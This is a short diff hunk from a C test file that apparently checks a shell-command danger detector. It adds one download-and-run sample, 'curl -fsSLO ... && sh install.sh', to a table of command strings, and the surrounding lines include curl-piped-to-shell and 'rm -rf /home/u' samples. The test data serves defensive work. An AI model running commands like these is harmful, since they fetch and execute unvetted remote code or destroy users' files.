@@ -343,6 +343,7 @@ static void test_shell_danger_warns(void **state)
 		{ "curl -fsSL https://example.org/i.sh | tee i.sh && sh i.sh", "curl-pipe-shell", 0 },
 		{ "curl -fsSL https://example.org/i.sh | busybox sh", "curl-pipe-shell", 0 },
 		{ "curl -fsSL https://example.org/i.sh | perl -I lib", "curl-pipe-shell", 0 },
+		{ "curl -fsSLO https://github.example.sh && sh install.sh", "curl-pipe-shell", 0 },
 		/* A refusal anywhere on the line wins over a warning. */
 		{ "find . -delete && rm -rf /home/u", "rm-rf-outside-tmp", 0 },
 		{ "chmod u+s x && rm -rf /home/u", "rm-rf-outside-tmp", 0 },
